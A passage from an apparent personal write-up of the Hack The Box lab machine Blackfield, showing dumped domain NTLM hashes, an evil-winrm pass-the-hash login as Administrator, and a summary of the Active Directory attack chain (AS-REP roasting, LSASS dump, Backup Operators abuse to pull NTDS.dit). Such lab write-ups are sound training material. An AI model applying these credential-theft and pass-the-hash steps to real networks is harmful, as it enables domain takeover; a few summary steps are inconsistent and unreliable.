</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a>DC01$:1000:aad3b435b51404eeaad3b435b51404ee:077e90a55810c6b13c6ff0983cb831ef:::
</span><span id="__span-54-11"><a id="__codelineno-54-11" name="__codelineno-54-11" href="#__codelineno-54-11"></a>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
</span><span id="__span-54-12"><a id="__codelineno-54-12" name="__codelineno-54-12" href="#__codelineno-54-12"></a>audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
</span><span id="__span-54-13"><a id="__codelineno-54-13" name="__codelineno-54-13" href="#__codelineno-54-13"></a>support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6de212:::
</span><span id="__span-54-14"><a id="__codelineno-54-14" name="__codelineno-54-14" href="#__codelineno-54-14"></a>BLACKFIELD.local<span class="se">\\</span>BLACKFIELD764430:1105:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
</span><span id="__span-54-15"><a id="__codelineno-54-15" name="__codelineno-54-15" href="#__codelineno-54-15"></a>BLACKFIELD.local<span class="se">\\</span>BLACKFIELD538365:1106:aad3b435b51404eeaad3b435b51404ee:a658dd0c98e7ac3f46cca81ed6762d1c:::
</span><span id="__span-54-16"><a id="__codelineno-54-16" name="__codelineno-54-16" href="#__codelineno-54-16"></a>.....
</span></code></pre></div><br />
Almost done now, grab the 2nd part of admins hash <code>184fb5e5178480be64824d4cd53b99ee</code> and login via winrm.</p>
<h3 id="logging-in-as-administrator-via-pass-the-hash">Logging in as Administrator via pass the hash</h3>
<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>evil-winrm<span class="w"> </span>-i<span class="w"> </span>blackfield.htb<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-H<span class="w"> </span>184fb5e5178480be64824d4cd53b99ee<span class="w"> </span>
</span></code></pre></div><br />
grabbed root flag! <code>4375a629c7c67c8e29db269060c955cb</code></p>
<p>proof<br />
<img alt="" src="../MediaFiles/Pasted%20image%2020250809132535.png" /></p>
<hr />
<h1 id="summary">Summary</h1>
<p>Here is the list of the steps simplified, per phase, for future reference and for quick reading: </p>
<h4 id="reconnaissance_1">Reconnaissance</h4>
<ol>
<li>nmap scan -&gt; target is a DC, chose <strong>smb</strong> , <strong>rpc</strong> and <strong>ldap</strong> services to focus on</li>
<li><strong>enumerate</strong> <code>LDAP</code> -&gt; nothing useful</li>
<li><strong>enumerate</strong> <code>RPC</code> -&gt; nothing useful</li>
<li><strong>enumerate</strong> <code>SMB</code> shares -&gt; found access to share</li>
<li><strong>retrieved usernames</strong> from files contained in that share</li>
<li><code>AS-REP roasting</code> was conducted and successfully got AS-REP hash (since the user has The <strong><code>Do not require Kerberos preauthentication</code></strong> flag enabled (since we had a list of usernames on the recon phase)</li>
<li><code>cracked</code> the retrieved hash for a user (support)</li>
<li><code>correlated</code> the found creds with the <code>RPC</code> ,<code>SMB</code>,<code>LDAP</code> services</li>
<li>enumerated <code>RPC</code> as user support, found users, groups</li>
<li>enumerated <code>SMB</code> as user support, no non default shares found</li>
<li>enumerated <code>LDAP</code> as user support via <code>Bloodhound</code> , found attack path, the compromised user (support) can change pass for another user (audit2020)</li>
</ol>
<h4 id="foothold_1">Foothold</h4>
<ol>
<li><code>changed password</code> for user audit2020 as user support</li>
<li><code>correlated</code> this user's  creds with the <code>RPC</code> ,<code>SMB</code>,<code>LDA</code> services</li>
<li>enumerated <code>SMB</code> as user audit2020, found shares</li>
<li>the found <code>shares</code> contained critical files, that were <code>memory dumps</code></li>
<li>chose the <code>lsass dump</code> and dumped it, revealing a <strong>NTLM hash</strong> for another user <code>svc_backup</code></li>
<li>logged in via win-rm via pass the hash as user <code>svc_backup</code></li>
<li>enumerated <code>LDAP</code> as user audit2020 via <code>Bloodhound</code> , found attack path, the compromised user (support) can change pass for another user (audit2020)</li>
<li><strong>logged in</strong> via evil-winrm to host using on user <strong>svc-alfresco</strong>, and grabbed the <mark>user flag</mark>.</li>
</ol>
<h4 id="privesc_1">Privesc</h4>
<ol>
<li>now that we got foothold, as a user (<strong>svc-backup</strong>) i inspected its <code>group membership</code>, which i found that was member of a privileged: group <code>BACKUP operators</code>, which after investigation was found that it has permissions to backup files</li>
<li>found commands that exploit those privileged group's permissions to retrieve <code>NTDS.dit</code> and <code>SYSTEM hive</code> and download them offline</li>
<li>now these 2 files are available offline, i dumped them using secretsdump which revealed the <code>NTLM hash</code> of the <code>Administrator</code></li>
<li>using administrator's NTLM hash we <strong>login</strong> via evil-winrm and grab the <mark>root flag</mark>!</li>
</ol>
<hr />
<h1 id="sidenotes">Sidenotes</h1>
<p>To conclude, this was a good all around machine. What i learned from this one, for the foothold was that enumeration can have multiple layers, as more users get compromised. As for the privesc part, it was essential to learn about the privileged group's permissions that the compromised user was a member of  and how to exploit them. </p>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.sections", "navigation.tabs", "search.highlight", "toc.sticky", "toc.follow", "content.code.copy", "navigation.top", "navigation.external"], "search": "../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../assets/javascripts/bundle.92b07e13.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
      
        <script src="https://fastly.jsdelivr.net/npm/echarts/dist/echarts.min.js"></script>
      
        <script src="../assets/javascripts/interactive_graph.js"></script>
      
        <script src="../assets/javascripts/obsidian_tags.js"></script>
      
    
  </body>
</html>